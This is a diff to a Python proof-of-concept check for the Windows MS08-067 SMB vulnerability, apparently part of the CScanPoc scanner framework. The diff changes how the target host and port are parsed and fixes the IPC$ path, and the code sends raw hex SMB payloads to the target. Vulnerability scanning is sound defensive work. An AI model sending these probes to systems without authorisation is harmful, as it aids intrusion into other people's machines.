@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import socket
 import urllib
+import urlparse
 
 class Vuln(ABVuln):
     vuln_id = 'MS08-067_0001_p'  # 平台漏洞编号，留空
@@ -47,9 +48,10 @@ class Poc(ABPoc):
             #port = args['options']['port']
 
             #获取host和端口
-            proto, rest = urllib.splittype(self.target)
-            host, rest = urllib.splithost(rest)
-            host, port = urllib.splitport(host)
+            target_parse = urlparse.urlparse(self.target)
+            host = socket.gethostbyname(target_parse.hostname)
+            port = target_parse.port if target_parse.port else 80
+
             portint = int(port)
             payload = [
                 ('00000045ff534d427200000000000008000000000000000000000000ffff00000000000000220'
@@ -94,7 +96,7 @@ class Poc(ABPoc):
             s.send(setuserid(userid,payload[2]))
             s.recv(1024)
             data = setuserid(userid,payload[3])
-            path = '\\\\%s\\IPC$\x00' % ip
+            path = '\\\\%s\\IPC$\x00' % host
             path = path + (26-len(path))*'\x3f'+'\x00'
             data = data + path
             s.send(data)
